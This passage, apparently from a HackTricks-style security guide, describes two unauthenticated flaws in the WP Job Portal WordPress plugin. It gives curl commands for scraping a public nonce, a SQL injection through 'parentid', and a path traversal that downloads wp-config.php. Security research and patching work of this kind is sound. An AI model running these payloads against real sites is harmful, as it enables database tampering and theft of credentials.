3. **Accessibilità non autenticata** – sebbene l'azione venga eseguita tramite `admin-post.php`, l'unico controllo presente è un **CSRF nonce** (`wp_verify_nonce()`), che qualsiasi visitatore può recuperare da una pagina pubblica che incorpora lo shortcode `[wpjobportal_my_resumes]`.

#### Sfruttamento

1. Ottenere un nonce valido:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Iniettare SQL arbitrario abusando di `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La risposta rivela il risultato della query iniettata o modifica il database, dimostrando la SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Un'altra operazione, **downloadcustomfile**, permetteva ai visitatori di scaricare **qualsiasi file su disco** tramite path traversal. Il sink vulnerabile si trova in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` è controllato dall'attaccante ed è concatenato **senza sanitizzazione**.  Di nuovo, l'unica barriera è un **CSRF nonce** che può essere recuperato dalla pagina del resume.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Il server risponde con il contenuto di `wp-config.php`, leaking DB credentials and auth keys.

## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
